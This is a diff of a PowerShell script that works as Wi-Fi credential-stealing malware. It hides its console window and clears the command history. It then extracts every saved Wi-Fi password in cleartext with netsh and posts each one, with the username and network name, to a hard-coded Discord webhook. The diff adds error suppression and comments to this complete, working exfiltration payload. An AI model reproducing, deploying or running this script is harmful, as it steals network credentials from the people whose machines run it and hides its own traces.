@@ -2,23 +2,45 @@
 Clear-History
 
 ###############################################################################
+# Hide the console window
 Add-Type '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindow' -Namespace 'Win32' -PassThru | Out-Null
 $consolePtr = [Win32.Win32ShowWindow]::GetConsoleWindow()
 [Win32.Win32ShowWindow]::ShowWindow($consolePtr, 0)  # 0 hides the window
 
-# ENG
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
-    
-    $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
-	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+# Set ErrorActionPreference to stop throwing red error messages
+$ErrorActionPreference = 'Stop'
 
-	$Body = @{
-		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
-	}
-	
-	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+try {
+    # Extract Wi-Fi profiles
+    netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+        $wlan = $_.Matches.Value
+        
+        # Extract the Wi-Fi password
+        try {
+            $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+        } catch {
+            #Write-Host "Failed to retrieve password for $wlan"
+            $passw = "N/A" # Assign a placeholder if password retrieval fails
+        }
+
+        # Discord webhook URL
+        $discord = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+
+        # Build the message body for the webhook
+        $Body = @{
+            'username' = $env:username + " | " + [string]$wlan
+            'content'  = [string]$passw
+        }
+
+        # Send the data to the Discord webhook
+        try {
+            Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+        } catch {
+            #Write-Host "Failed to send data to Discord webhook"
+        }
+    }
+} catch {
+    #Write-Host "An error occurred: $($_.Exception.Message)"
 }
 
 # Clear the PowerShell command history
